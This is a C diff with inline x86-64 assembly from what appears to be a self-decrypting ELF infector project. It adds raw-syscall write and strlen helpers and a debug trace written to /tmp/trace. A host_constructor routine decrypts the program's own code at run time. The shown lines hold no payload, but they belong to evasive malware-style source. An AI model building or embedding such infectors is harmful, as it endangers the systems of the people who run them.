@@ -105,6 +105,49 @@ __attribute__((always_inline)) static inline int _close(int fd)
 	return ret;
 }
 
+__attribute__((always_inline)) static inline ssize_t _write(int fd, const void *buf, size_t count)
+{
+	ssize_t ret;
+
+	asm volatile
+	(
+		"mov edi, %0\n"
+		"mov rsi, %1\n"
+		"mov rdx, %2\n"
+
+		"mov rax, 0x1\n"
+		"syscall\n"
+		:
+		: "g"(fd), "g"(buf), "g"(count)
+	);
+	asm volatile
+	(
+		"mov %0, rax\n"
+		: "=r"(ret)
+		:
+	);
+
+	return ret;
+}
+
+
+////////////////////////////////////////////////////////////////////////////////
+/// STATIC FUNCTION
+////////////////////////////////////////////////////////////////////////////////
+
+__attribute__((always_inline)) static inline size_t _strlen(const char *str)
+{
+	size_t ret = 0;
+
+	if (str == NULL)
+		return 0;
+
+	while (str[ret])
+		ret++;
+
+	return ret;
+}
+
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
@@ -113,8 +156,27 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, const ch
 {
 	decrypt_left(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
 
-	printf("%s\n\n", filename);
-	printf("%s\t%s\n", __PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+#if DEBUG
+	char function[] = "host_constructor:\t";
+	char name[] = "/tmp/trace";
+	int trace = _open(name, O_RDWR | O_APPEND, 0000);
+	char newline = 0xa;
+	char result = context + 48;
+	
+	if (trace > 0)
+	{
+		_write(trace, filename, _strlen(filename));
+		_write(trace, &newline, 1);
+		_write(trace, &newline, 1);
+
+		_write(trace, function, _strlen(function));
+		_write(trace, &result, 1);
+		_write(trace, &newline, 1);
+	}
+
+	_close(trace);
+#endif
+
 	if (context == FAILURE)
 		goto label;
 
